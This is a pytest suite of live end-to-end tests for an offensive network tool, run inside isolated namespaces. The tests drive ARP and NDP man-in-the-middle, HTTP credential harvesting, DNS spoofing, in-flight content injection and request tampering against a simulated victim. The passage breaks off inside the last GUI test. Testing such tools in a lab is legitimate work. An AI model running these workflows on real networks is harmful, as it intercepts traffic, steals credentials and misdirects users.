"""End-to-end offensive workflows over the real namespaced segment (root only).

Opt-in: sudo REFORGE_LIVE=1 python -m pytest tests/test_live_e2e.py -q

Unlike test_live_mitm (which proves the MITM mechanism), these run a full attack
to its objective through the real kernel: a victim does real work (an HTTP login,
a DNS lookup) and the tool achieves the offensive result (harvested credential,
spoofed answer).
"""

from __future__ import annotations

import os
import subprocess
import threading
import time

import pytest

from reforge.testlab.netlab import SegmentLab, is_root, netns_exec

pytestmark = pytest.mark.skipif(
    not (is_root() and os.environ.get("REFORGE_LIVE") == "1"),
    reason="live e2e tests need root and REFORGE_LIVE=1",
)

ATTACKER_IFACE = "rf-atk"


def _attacker_mac() -> str:
    from scapy.all import get_if_hwaddr
    return get_if_hwaddr(ATTACKER_IFACE).lower()


def _gw_mac_in_victim(gw_ip: str) -> str | None:
    from reforge.testlab.netlab import neigh_table
    for line in neigh_table("rf-victim", "-4").splitlines():
        parts = line.split()
        if parts and parts[0] == gw_ip and "lladdr" in parts:
            return parts[parts.index("lladdr") + 1].lower()
    return None


class _Harvester:
    """Capture on the attacker interface and extract credentials in a thread."""

    def __init__(self, iface: str):
        from reforge.attacks.creds import CredentialExtractor
        from reforge.attacks.stream_harvester import StreamHarvester
        from reforge.capture.afpacket import AfPacketBackend
        self.backend = AfPacketBackend([iface])
        self.ce = CredentialExtractor()
        self.sh = StreamHarvester()
        self.creds: list = []
        self._run = threading.Event()
        self._t: threading.Thread | None = None

    def start(self):
        from scapy.layers.l2 import Ether
        self.backend.open()
        self._run.set()

        def loop():
            while self._run.is_set():
                for f in self.backend.recv_burst(64, 0.3):
                    try:
                        self.creds += self.ce.extract(Ether(f.data))
                        self.creds += self.sh.add_frame(f.data)
                    except Exception:  # noqa: BLE001, S110 - best-effort harvest
                        pass

        self._t = threading.Thread(target=loop, daemon=True)
        self._t.start()

    def stop(self):
        self._run.clear()
        if self._t:
            self._t.join(timeout=2.0)
        self.backend.close()


def test_http_credential_harvest_over_arp_mitm():
    from reforge.attacks.arp_mitm import ArpMitm

    server = None
    harv = None
    mitm = None
    with SegmentLab() as net:
        try:
            # a real HTTP server the victim will log into, in the gateway ns
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), f"MITM did not start: {mitm.warnings}"
            assert mitm.status()["forwarding_on"], "need IP forwarding to relay"

            # wait until the victim actually routes through us
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            flipped = False
            for _ in range(15):
                if _gw_mac_in_victim(net["gateway_ip4"]) == atk_mac:
                    flipped = True
                    break
                time.sleep(0.4)
            assert flipped, "victim never routed through the attacker"

            harv = _Harvester(ATTACKER_IFACE)
            harv.start()
            time.sleep(0.4)

            # the victim logs in over HTTP (Basic auth) -> traffic relays through us
            for _ in range(3):
                netns_exec("rf-victim", "curl", "-s", "-m", "3",
                           "-u", "admin:s3cr3t",
                           f"http://{net['gateway_ip4']}:8000/", "-o", "/dev/null",
                           check=False)
                time.sleep(0.4)
                if any(getattr(c, "username", "") == "admin" for c in harv.creds):
                    break

            users = {(getattr(c, "kind", ""), getattr(c, "username", ""),
                      getattr(c, "secret", "")) for c in harv.creds}
            assert ("http-basic", "admin", "s3cr3t") in users, \
                f"credential not harvested; saw {users}"
        finally:
            if harv is not None:
                harv.stop()
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate()
                server.wait(timeout=3)


def _wait_flip(gw_ip: str, atk_mac: str, tries: int = 15) -> bool:
    for _ in range(tries):
        if _gw_mac_in_victim(gw_ip) == atk_mac:
            return True
        time.sleep(0.4)
    return False


def test_inline_content_injection_reaches_the_victim():
    """Flagship inline manipulation delivered end to end: the victim requests a
    page through the MITM and receives content the NFQUEUE rewrote in flight."""
    import tempfile

    netfilterqueue = pytest.importorskip("netfilterqueue")
    assert netfilterqueue

    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter

    qnum = 34
    docroot = tempfile.mkdtemp(prefix="rf-doc-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BANNER=ORIGINAL-TOKEN\n")     # same length as the replacement

    server = mitm = runner = rt = None
    remove = []
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip4"]])
            for cmd in install:
                subprocess.run(cmd, check=True, capture_output=True)
            engine = RuleEngine([Rule("inject",
                                      parse_filter('Raw.load contains "ORIGINAL-TOKEN"'),
                                      [PayloadReplace(b"ORIGINAL-TOKEN", b"INJECTED-TOKEN")])])
            runner = NfqueueRunner(engine, queue_num=qnum)
            rt = threading.Thread(target=runner.run, daemon=True)
            rt.start()
            time.sleep(0.6)

            # victim fetches the page THROUGH the MITM; the body is rewritten in flight
            got = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "curl", "-s", "-m", "4",
                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
                got = r.stdout
                if "INJECTED-TOKEN" in got:
                    break
                time.sleep(0.3)
            assert "INJECTED-TOKEN" in got, f"victim did not receive injected content: {got!r}"
            assert runner.stats.modified >= 1
        finally:
            if runner is not None:
                runner.stop()
            if rt is not None:
                rt.join(timeout=2.0)
            for cmd in remove:
                subprocess.run(cmd, check=False, capture_output=True)
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_dns_spoof_answers_the_victims_lookup():
    """The victim's DNS lookup (routed through the MITM) is answered by the tool
    with the attacker's IP — exercising the DNS-spoof parser live."""
    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.attacks.dns_spoof import DnsSpoofer

    mitm = spoof = sink = None
    with SegmentLab() as net:
        try:
            # a silent UDP sink on the gateway:53 so the victim's query isn't met
            # with an ICMP port-unreachable — the on-path spoof is then the only
            # answer that comes back
            sink_code = (
                "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
                f"s.bind(('{net['gateway_ip4']}',53))\n"
                "while True: s.recvfrom(2048)")
            sink = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-c", sink_code],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            spoof = DnsSpoofer(ATTACKER_IFACE, {"*.corp.local": "10.9.9.1"})
            spoof.start()
            time.sleep(0.6)

            # the victim resolves a name via the gateway (its DNS goes through us)
            answer = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "dig", "+short", "+time=2", "+tries=1",
                               f"@{net['gateway_ip4']}", "intranet.corp.local",
                               check=False)
                answer = (r.stdout or "").strip()
                if "10.9.9.1" in answer:
                    break
                time.sleep(0.3)
            assert "10.9.9.1" in answer, f"victim was not poisoned; got {answer!r}"
        finally:
            if spoof is not None:
                spoof.stop()
            if mitm is not None:
                mitm.stop()
            if sink is not None:
                sink.terminate(); sink.wait(timeout=3)


def test_interactive_intercept_edit_is_delivered():
    """The operator holds the victim's request, edits it, releases it, and the
    modified request is what actually reaches the server (hold -> edit -> deliver)."""
    import tempfile

    pytest.importorskip("netfilterqueue")

    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
    from reforge.core.intercept import InterceptQueue
    from reforge.rules.actions import Hold
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter

    qnum = 35
    docroot = tempfile.mkdtemp(prefix="rf-doc-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("SAFE-CONTENT\n")
    with open(os.path.join(docroot, "evil.html"), "w") as fh:
        fh.write("PWNED-CONTENT\n")           # /page.html and /evil.html are same length

    server = mitm = runner = rt = op = None
    remove = []
    stop_op = threading.Event()
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip4"]])
            for cmd in install:
                subprocess.run(cmd, check=True, capture_output=True)

            queue = InterceptQueue()
            engine = RuleEngine([Rule("hold", parse_filter('Raw.load contains "/page.html"'),
                                      [Hold()])])
            runner = NfqueueRunner(engine, queue_num=qnum, intercept=queue)
            rt = threading.Thread(target=runner.run, daemon=True)
            rt.start()

            # the operator: as soon as a request is held, rewrite the path and
            # release. Rebuild through scapy (clearing checksums) exactly as the
            # GUI packet editor does, so the edited request is valid on the wire.
            def _edit(raw: bytes) -> bytes:
                from scapy.layers.inet import IP, TCP
                pkt = IP(raw.replace(b"/page.html", b"/evil.html"))
                if pkt.haslayer(TCP):
                    del pkt[TCP].chksum
                del pkt.chksum
                return bytes(pkt)

            def operate():
                while not stop_op.is_set():
                    for hp in list(queue.pending()):
                        queue.resolve(hp.id, "modify", _edit(hp.data))
                    time.sleep(0.05)

            op = threading.Thread(target=operate, daemon=True)
            op.start()
            time.sleep(0.6)

            got = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "curl", "-s", "-m", "5",
                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
                got = r.stdout
                if "PWNED-CONTENT" in got:
                    break
                time.sleep(0.3)
            # the victim asked for /page.html but the operator's edit delivered evil.html
            assert "PWNED-CONTENT" in got, f"intercept edit not delivered: {got!r}"
            assert queue.stats["modified"] >= 1
        finally:
            stop_op.set()
            if op is not None:
                op.join(timeout=2.0)
            if runner is not None:
                runner.stop()
            if rt is not None:
                rt.join(timeout=2.0)
            for cmd in remove:
                subprocess.run(cmd, check=False, capture_output=True)
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def _router_mac_in_victim6(router_ip6: str) -> str | None:
    from reforge.testlab.netlab import neigh_table
    for line in neigh_table("rf-victim", "-6").splitlines():
        parts = line.split()
        if parts and parts[0] == router_ip6 and "lladdr" in parts:
            return parts[parts.index("lladdr") + 1].lower()
    return None


def test_ipv6_ndp_mitm_content_injection_reaches_victim():
    """IPv6 parity for the inline path: NDP-MITM the victim, and the NFQUEUE
    rewrites their forwarded IPv6 HTTP traffic (the ip6 nft matcher fix)."""
    import tempfile

    pytest.importorskip("netfilterqueue")

    from reforge.attacks.ndp_mitm import NdpMitm
    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter

    qnum = 36
    docroot = tempfile.mkdtemp(prefix="rf-doc6-")
    with open(os.path.join(docroot, "p.html"), "w") as fh:
        fh.write("V6BANNER=ORIGINAL-TKN\n")     # same length as the replacement

    server = mitm = runner = rt = None
    remove = []
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip6"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = NdpMitm(ATTACKER_IFACE, [net["victim_ip6"]],
                           router=net["gateway_ip6"], interval=1.0)
            assert mitm.start(), f"NDP MITM did not start: {mitm.warnings}"
            assert mitm.status()["forwarding_on"], "need IPv6 forwarding to relay"

            netns_exec("rf-victim", "ping", "-6", "-c", "1", "-W", "1", net["gateway_ip6"],
                       check=False)
            flipped = False
            for _ in range(20):
                if _router_mac_in_victim6(net["gateway_ip6"]) == atk_mac:
                    flipped = True
                    break
                time.sleep(0.4)
            assert flipped, "victim never routed IPv6 through the attacker"

            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip6"]])
            for cmd in install:
                r = subprocess.run(cmd, capture_output=True, text=True, check=False)
                assert r.returncode == 0, f"nft rule failed: {' '.join(cmd)} -> {r.stderr}"
            engine = RuleEngine([Rule("inject",
                                      parse_filter('Raw.load contains "ORIGINAL-TKN"'),
                                      [PayloadReplace(b"ORIGINAL-TKN", b"INJECTED-TKN")])])
            runner = NfqueueRunner(engine, queue_num=qnum)
            rt = threading.Thread(target=runner.run, daemon=True)
            rt.start()
            time.sleep(0.6)

            got = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "curl", "-s", "-g", "-m", "5",
                               f"http://[{net['gateway_ip6']}]:8000/p.html", check=False)
                got = r.stdout
                if "INJECTED-TKN" in got:
                    break
                time.sleep(0.3)
            assert "INJECTED-TKN" in got, f"IPv6 victim did not get injected content: {got!r}"
            assert runner.stats.modified >= 1
        finally:
            if runner is not None:
                runner.stop()
            if rt is not None:
                rt.join(timeout=2.0)
            for cmd in remove:
                subprocess.run(cmd, check=False, capture_output=True)
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_userspace_bridge_delivers_and_injects_a_real_tcp_flow():
    """The tool's own userspace bridge (not NFQUEUE) forwards a full real TCP
    flow between two hosts and rewrites the response inline; the client receives
    the injected content."""
    import tempfile

    from reforge.core.bridge import UserspaceBridge
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter
    from reforge.testlab.netlab import BridgeFlowLab

    docroot = tempfile.mkdtemp(prefix="rf-bf-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BODY=ORIGINAL-TOKEN\n")     # same length as the replacement

    server = bridge = None
    with BridgeFlowLab() as lab:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", lab["server_ns"], "python3", "-m", "http.server",
                 "8000", "--bind", lab["server_ip"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            engine = RuleEngine([Rule("inject",
                                      parse_filter('Raw.load contains "ORIGINAL-TOKEN"'),
                                      [PayloadReplace(b"ORIGINAL-TOKEN", b"INJECTED-TOKEN")])])
            bridge = UserspaceBridge(lab["port_a"], lab["port_b"], engine, armed=True)
            bridge.start()
            assert bridge.wait_ready(5.0), "bridge did not come up"

            got = ""
            for _ in range(3):
                r = netns_exec(lab["client_ns"], "curl", "-s", "-m", "8",
                               f"http://{lab['server_ip']}:8000/page.html", check=False)
                got = r.stdout
                if "INJECTED-TOKEN" in got:
                    break
                time.sleep(0.3)
            assert "INJECTED-TOKEN" in got, f"bridge did not deliver/inject: {got!r}"
            assert bridge.counters.modified >= 1
            assert bridge.counters.errors == 0
        finally:
            if bridge is not None:
                bridge.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def _run_two_segment_flow(flow_rewrite: bool, find: bytes = b"SHORT-X",
                          replace: bytes = b"MUCH-LONGER-REPLACEMENT") -> str:
    """Client reads a 2-segment server response where the bridge edits the first
    segment's length (grow or shrink); returns what the client received. With
    flow_rewrite the second segment must still arrive (seq/ack fix-up)."""
    import textwrap

    from reforge.core.bridge import UserspaceBridge
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter
    from reforge.testlab.netlab import BridgeFlowLab

    server = bridge = None
    with BridgeFlowLab() as lab:
        try:
            srv_code = textwrap.dedent(f'''
                import socket, time
                s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("{lab['server_ip']}", 9099)); s.listen(1)
                c, _ = s.accept()
                c.sendall(b"FIRST:{find.decode()}\\n"); time.sleep(0.3)
                c.sendall(b"SECOND-PART-INTACT\\n"); time.sleep(0.2); c.close()
            ''')
            server = subprocess.Popen(
                ["ip", "netns", "exec", lab["server_ns"], "python3", "-c", srv_code],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

            engine = RuleEngine([Rule("edit", parse_filter(f'Raw.load contains "{find.decode()}"'),
                                      [PayloadReplace(find, replace)])])
            bridge = UserspaceBridge(lab["port_a"], lab["port_b"], engine, armed=True,
                                     flow_rewrite=flow_rewrite)
            bridge.start(); bridge.wait_ready(5.0)

            cli_code = textwrap.dedent(f'''
                import socket
                s = socket.socket(); s.settimeout(6); s.connect(("{lab['server_ip']}", 9099))
                buf = b""
                try:
                    while True:
                        d = s.recv(4096)
                        if not d: break
                        buf += d
                except Exception:
                    pass
                import sys; sys.stdout.write(buf.decode("latin-1"))
            ''')
            r = netns_exec(lab["client_ns"], "python3", "-c", cli_code, check=False)
            return r.stdout
        finally:
            if bridge is not None:
                bridge.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_seqfix_keeps_a_length_changing_flow_in_sync():
    """flow_rewrite must keep a real multi-segment TCP flow consistent after a
    length-changing inline edit: the grown first segment AND the untouched second
    segment both reach the client. Without it, the flow desyncs (regression guard
    for the reverse-ACK sign bug)."""
    got = _run_two_segment_flow(flow_rewrite=True)
    assert "MUCH-LONGER-REPLACEMENT" in got, f"edit not delivered: {got!r}"
    assert "SECOND-PART-INTACT" in got, f"seq-fixup lost the 2nd segment: {got!r}"


def test_length_change_without_seqfix_desyncs():
    """Control: the same length-changing edit WITHOUT flow_rewrite desyncs the
    flow, so the second segment does not make it through."""
    got = _run_two_segment_flow(flow_rewrite=False)
    assert "SECOND-PART-INTACT" not in got     # desynced, as expected


def test_bidirectional_length_changing_edits_stay_in_sync():
    """The hardest seq-fixup case: the client's request grows AND the server's
    response grows on the same flow. Both directions' seq/ack must stay
    consistent — the server sees the grown request, the client the grown
    response, and the connection completes."""
    import textwrap

    from reforge.core.bridge import UserspaceBridge
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter
    from reforge.testlab.netlab import BridgeFlowLab

    server = bridge = None
    with BridgeFlowLab() as lab:
        try:
            srv_code = textwrap.dedent(f'''
                import socket, time
                s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("{lab['server_ip']}", 9099)); s.listen(1)
                c, _ = s.accept()
                req = c.recv(4096)
                c.sendall(b"GOT[" + req.strip() + b"] RESP-SHORT\\n")
                time.sleep(0.2); c.close()
            ''')
            server = subprocess.Popen(
                ["ip", "netns", "exec", lab["server_ns"], "python3", "-c", srv_code],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

            engine = RuleEngine([
                Rule("req", parse_filter('Raw.load contains "REQ-SHORT"'),
                     [PayloadReplace(b"REQ-SHORT", b"REQ-MUCH-LONGER-XYZ")]),
                Rule("resp", parse_filter('Raw.load contains "RESP-SHORT"'),
                     [PayloadReplace(b"RESP-SHORT", b"RESP-MUCH-LONGER-ABC")]),
            ])
            bridge = UserspaceBridge(lab["port_a"], lab["port_b"], engine, armed=True,
                                     flow_rewrite=True)
            bridge.start(); bridge.wait_ready(5.0)

            cli_code = textwrap.dedent(f'''
                import socket, sys
                s = socket.socket(); s.settimeout(6); s.connect(("{lab['server_ip']}", 9099))
                s.sendall(b"REQ-SHORT\\n")
                buf = b""
                try:
                    while True:
                        d = s.recv(4096)
                        if not d: break
                        buf += d
                except Exception: pass
                sys.stdout.write(buf.decode("latin-1"))
            ''')
            got = netns_exec(lab["client_ns"], "python3", "-c", cli_code, check=False).stdout
            assert "REQ-MUCH-LONGER-XYZ" in got, f"server didn't see grown request: {got!r}"
            assert "RESP-MUCH-LONGER-ABC" in got, f"client didn't get grown response: {got!r}"
            assert bridge.counters.errors == 0
        finally:
            if bridge is not None:
                bridge.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_seqfix_handles_a_shrinking_edit():
    """flow_rewrite must also keep the flow in sync when an edit SHRINKS a
    segment (negative delta): the shrunk first segment and the intact second
    both reach the client."""
    got = _run_two_segment_flow(flow_rewrite=True,
                                find=b"LONG-CONTENT-TO-SHRINK", replace=b"X")
    assert "FIRST:X" in got, f"shrink not delivered: {got!r}"
    assert "SECOND-PART-INTACT" in got, f"seq-fixup lost the 2nd segment: {got!r}"


def test_watchdog_fail_open_restores_the_wire_when_the_bridge_dies():
    """Availability guarantee: a userspace bridge is a single point of failure —
    if it stalls, the watchdog must trip and hand the link to a kernel bridge so
    the wire doesn't stay dark. Proven live: connectivity works through the
    bridge, goes dark when it stops, and the watchdog's fail-open restores it."""
    from reforge.core.bridge import UserspaceBridge
    from reforge.core.watchdog import Watchdog
    from reforge.privhelper.netconfig import RevertJournal, fail_open_commands
    from reforge.testlab.netlab import BridgeFlowLab

    def ping(lab) -> bool:
        return netns_exec(lab["client_ns"], "ping", "-c1", "-W1", lab["server_ip"],
                          check=False).returncode == 0

    bridge = wd = None
    journal = RevertJournal()
    with BridgeFlowLab() as lab:
        try:
            assert not ping(lab), "no path should exist before the bridge starts"

            bridge = UserspaceBridge(lab["port_a"], lab["port_b"], armed=False)
            bridge.start()
            assert bridge.wait_ready(5.0)
            time.sleep(0.3)
            assert ping(lab), "bridge should forward"

            tripped = threading.Event()

            def enact():
                fail_open_commands(lab["port_a"], lab["port_b"], journal, apply=True)
                tripped.set()

            wd = Watchdog(bridge.heartbeat_age, timeout=1.0, on_trip=enact,
                          poll_interval=0.2)
            wd.start()

            # the bridge stalls (loop stops ticking); the watchdog must trip
            bridge.stop(); bridge = None
            assert tripped.wait(6.0), "watchdog never tripped on the stalled bridge"

            time.sleep(1.0)
            assert ping(lab), "fail-open kernel bridge should restore the wire"
        finally:
            if wd is not None:
                wd.stop()
            if bridge is not None:
                bridge.stop()
            journal.revert(lambda c: subprocess.run(c, capture_output=True, check=False))
            from reforge.privhelper.netconfig import FAIL_BRIDGE
            subprocess.run(["ip", "link", "del", FAIL_BRIDGE],
                           capture_output=True, check=False)


def test_ipv6_length_changing_edit_stays_in_sync():
    """seq/ack fix-up over IPv6: grow the first of two server segments on an IPv6
    TCP flow through the bridge; both the grown first and the intact second reach
    the client (regression guard for the IPv4-only flow-key crash)."""
    import textwrap

    from reforge.core.bridge import UserspaceBridge
    from reforge.rules.actions import PayloadReplace
    from reforge.rules.base import Rule
    from reforge.rules.engine import RuleEngine
    from reforge.rules.filter import parse_filter
    from reforge.testlab.netlab import BridgeFlowLab

    server = bridge = None
    with BridgeFlowLab() as lab:
        try:
            srv_code = textwrap.dedent(f'''
                import socket, time
                s = socket.socket(socket.AF_INET6)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("{lab['server_ip6']}", 9099)); s.listen(1)
                c, _ = s.accept()
                c.sendall(b"FIRST:SHORT-X\\n"); time.sleep(0.3)
                c.sendall(b"SECOND-PART-INTACT\\n"); time.sleep(0.2); c.close()
            ''')
            server = subprocess.Popen(
                ["ip", "netns", "exec", lab["server_ns"], "python3", "-c", srv_code],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)

            engine = RuleEngine([Rule("grow", parse_filter('Raw.load contains "SHORT-X"'),
                                      [PayloadReplace(b"SHORT-X", b"MUCH-LONGER-REPLACEMENT")])])
            bridge = UserspaceBridge(lab["port_a"], lab["port_b"], engine, armed=True,
                                     flow_rewrite=True)
            bridge.start(); bridge.wait_ready(5.0)

            cli_code = textwrap.dedent(f'''
                import socket, sys
                s = socket.socket(socket.AF_INET6); s.settimeout(6)
                s.connect(("{lab['server_ip6']}", 9099))
                buf = b""
                try:
                    while True:
                        d = s.recv(4096)
                        if not d: break
                        buf += d
                except Exception: pass
                sys.stdout.write(buf.decode("latin-1"))
            ''')
            got = netns_exec(lab["client_ns"], "python3", "-c", cli_code, check=False).stdout
            assert "MUCH-LONGER-REPLACEMENT" in got, f"IPv6 edit not delivered: {got!r}"
            assert "SECOND-PART-INTACT" in got, f"IPv6 seq-fixup lost the 2nd segment: {got!r}"
            assert bridge.counters.errors == 0
        finally:
            if bridge is not None:
                bridge.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_gui_start_inline_rewrites_victim_traffic():
    """Drive the real GUI wiring: a rule added to the rules panel + MainWindow.
    _start_inline installs the nft queue and runs the NFQUEUE, and the MITM'd
    victim receives content the GUI rewrote in flight."""
    import tempfile

    pytest.importorskip("netfilterqueue")
    from PySide6.QtWidgets import QApplication

    from reforge.attacks.arp_mitm import ArpMitm

    app = QApplication.instance() or QApplication([])
    assert app is not None

    docroot = tempfile.mkdtemp(prefix="rf-gui-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BANNER=ORIGINAL-TOKEN\n")     # same length as the replacement

    server = mitm = win = None
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            # the operator adds a rewrite rule in the Rules panel, then arms inline
            from reforge.gui.main_window import MainWindow
            win = MainWindow()
            win.rules_panel.specs.append({
                "name": "inject", "enabled": True, "match": {"type": "all"},
                "actions": [{"type": "payload_replace",
                             "find": "ORIGINAL-TOKEN", "replace": "INJECTED-TOKEN"}],
            })
            status = win._start_inline(ATTACKER_IFACE, [net["victim_ip4"]])
            assert "inline" in status.lower()
            assert win._nfq_runner is not None
            time.sleep(0.6)

            got = ""
            for _ in range(4):
                r = netns_exec("rf-victim", "curl", "-s", "-m", "5",
                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
                got = r.stdout
                if "INJECTED-TOKEN" in got:
                    break
                time.sleep(0.3)
            assert "INJECTED-TOKEN" in got, f"GUI inline path did not rewrite: {got!r}"
            assert win._nfq_runner.stats.modified >= 1
        finally:
            if win is not None:
                win._stop_inline()          # tears down the nft rules + runner
            if mitm is not None:
                mitm.stop()
            if server is not None:
                server.terminate(); server.wait(timeout=3)


def test_gui_interactive_intercept_holds_and_releases_via_panel():
    """Full GUI interactive path: an Intercept-panel filter holds the victim's
    HTTP request in the shared queue; the operator sees it in the panel and
    releases it, and only then does the request reach the server."""
    import tempfile

    pytest.importorskip("netfilterqueue")
    from PySide6.QtWidgets import QApplication

    from reforge.attacks.arp_mitm import ArpMitm
    from reforge.rules.filter import parse_filter

    app = QApplication.instance() or QApplication([])
    assert app is not None
    docroot = tempfile.mkdtemp(prefix="rf-gui2-")
    with open(os.path.join(docroot, "page.html"), "w") as fh:
        fh.write("BANNER=HELD-THEN-RELEASED\n")

    server = mitm = win = None
    result: dict = {}
    with SegmentLab() as net:
        try:
            server = subprocess.Popen(
                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
                 "8000", "--bind", net["gateway_ip4"]],
                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.0)

            atk_mac = _attacker_mac()
            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
                           gateway=net["gateway_ip4"], interval=1.0)
            assert mitm.start(), mitm.warnings
            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
                       check=False)
            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"

            from reforge.gui.main_window import MainWindow
            win = MainWindow()
            # operator sets an Intercept filter that holds the HTTP request
            win._on_intercept_filter(parse_filter('Raw.load contains "GET /"'), "http get")
            win._start_inline(ATTACKER_IFACE, [net["victim_ip4"]])
            time.sleep(0.6)

            def do_curl():
                r = netns_exec("rf-victim", "curl", "-s", "-m", "10",
                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
                result["out"] = r.stdout

            t = threading.Thread(target=do_curl, daemon=True); t.start()

